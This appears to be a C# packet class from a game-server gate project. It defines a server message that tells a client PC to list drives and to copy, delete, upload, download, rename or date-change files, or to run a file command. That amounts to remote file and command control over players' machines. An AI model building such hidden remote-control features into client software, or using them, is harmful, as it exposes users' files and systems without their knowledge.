using AionCommons.Network.Packet;
using System;
using System.Collections.Generic;
using System.Text;

namespace AionNetGate.Netwok.Server
{
    public class SM_EXPLORER_PC : AbstractServerPacket
    {
        private string _dir;
        private int _hashcode;
        private FileTpye _type;

        public SM_EXPLORER_PC(string dir, FileTpye type)
        {
            this._dir = dir;
            this._type = type;
        }

        public SM_EXPLORER_PC(int hashcode, string fileOrDir, FileTpye type)
        {
            this._hashcode = hashcode;
            this._dir = fileOrDir;
            this._type = type;
        }

        protected override void writeImpl()
        {
            base.writeC((byte)this._type);
            base.writeS(this._dir + ((this._hashcode > 0) ? ("\t" + this._hashcode) : ""));
        }
    }


    public enum FileTpye
    {
        SHOW_DRIVES,
        SHOW_FILE_OR_DIR,
        COPY_FILE_OR_DIR,
        DEL_FILE_OR_DIR,
        DOWN_FILE_OR_DIR,
        UPLOAD_FILE_OR_DIR,
        NEW_FOLDER,
        RENAME,
        RUN_FILE_COMMAND,
        CHANGE_FILE_DATE,
        NEW_FILE
    }
}
